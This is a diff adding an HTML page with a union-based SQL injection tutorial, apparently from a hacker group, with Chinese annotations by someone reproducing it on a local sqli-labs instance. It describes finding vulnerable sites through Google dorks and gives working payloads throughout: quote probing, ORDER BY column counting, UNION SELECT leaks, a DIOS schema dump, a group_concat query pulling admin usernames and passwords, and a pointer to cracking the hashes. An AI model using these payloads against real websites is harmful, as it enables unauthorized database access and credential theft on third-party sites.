@@ -1,0 +1,38 @@
+<p>Simplified Tutorial of Union Based Sql injection<br />Mozzila firefox<br />Hackbar modded (google for modded hackbar)</p>
+<p>First Dorking<br />Google this Google dorks there will be specific dorks that you may use<br />One you choose a dork and a site</p>
+<p>Example: www.site.com/index.php?id=1<br />Put this symbols ' or *</p>
+<p>加个单引号或者 * ，可以探索出该点存在SQLI 注入点（字符型注入点）</p>
+<p>www.site.com/index.php?id=1'<br />then of you see an error (Mysql error Etc.)</p>
+<p>It means vulnerable</p>
+<p>Then colum counting 下面使用了 ORDER BY [数字] 的方式，来判断某个表有多少列。</p>
+<p>www.site.com/index.php?id=1'+ORDER+BY+1-- (no error)<br />www.site.com/index.php?id=1'+ORDER+BY+2-- (no error)<br />www.site.com/index.php?id=1'+ORDER+BY+3-- (no error)<br />www.site.com/index.php?id=1'+ORDER+BY+4-- (no error)<br />www.site.com/index.php?id=1'+ORDER+BY+5-- (error)</p>
+<p>Note the error is on number 5 so it means the number of colums is 4. （最多4列，因为第五列报错了）</p>
+<p>So lets check for the vuln column count by the example below and put - after the id=<br />www.site.com/index.php?id=-1+UNION+ALL+SELECT+1,2,3,4--</p>
+<p>（运行这个，会得到下面的结果，目的是为了得知该SQLI注入可以成功（获得不到任何数据，暂时，只要可以看到数字1,2,3,4就可以））</p>
+<p>id = -1 的目的，是为了让2,3 可以显示出来。 因为很多时候，php后端取到如果有2行结果的话，就只会显示上面的一行。</p>
+<p>如果 id = 1的话， union之后是2行结果。 如果id = -1, 那么union之后是一行结果，也就是下面的 1, 2, 3</p>
+<pre>id	username	password
+1	2	        3
+</pre>
+<p>There will be a number that will pop out example the vuln number is 2 put it like this.</p>
+<p>Then to check for the database, user, version is like the example below and just replace the databse for user and version same thing that you put like database </p>
+<p>http://www.site.com/index.php?id=-1+UNION+ALL+SELECT+1%2C%40%40database%2C3%2C4--</p>
+<p>上面这里是原文错误。 原文中url decode之后，参数是：&#160; id=-1 union all select1, @@database, 3 --</p>
+<p>实际上MySQL 5.7中没有 @@database 变量，但是有 database() 函数。所以这里可以写成：</p>
+<p>id=-1' union select 1,database(),3 --+</p>
+<p>经过url encode之后，完整路径是： （使用了sqlilab的url ）</p>
+<p>http://localhost/sqliphp7/Less-1/?id=-1%27%20union%20select%201,database(),3%20--+</p>
+<p>此时可以看到结果：(出现了sqli 数据库的名称)</p>
+<pre>id	username	password
+1	sqli	        3
+</pre>
+<p>To dump data use dios on your hackbar just select union based then find dios mysql then pick anything<br />www.site.com/index.php?id=-1+UNION+ALL+SELECT+1,(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)),3,4--</p>
+<p>上面这个SQL我没看懂。。。从墓地上看似乎是想获得 username? </p>
+<p>Then find the admin and username it may different to other sites.</p>
+<p>After you got the username and pass form the the tables (ex. uname and pass)<br />used group_concat</p>
+<p>id=-1+UNION+ALL+SELECT+1,group_concat(uname,0x3c62723e,pass),3,4</p>
+<p>也就是下面的这个</p>
+<p>http://www.site.com/index.php?id=-1+UNION+ALL+SELECT+1%2Cgroup_concat%28uname%2C0x3c62723e%2Cpass%29%2C3%2C4</p>
+<p><br />the 0x3c62723e is &lt;br&gt; and from admin it came from the admin or sometimes is different form other site</p>
+<p>The after you got a pass and it is encrypted just decrypt it here haskiller</p>
+<p>Like our page "COD3X CYBER ARMY" </p>
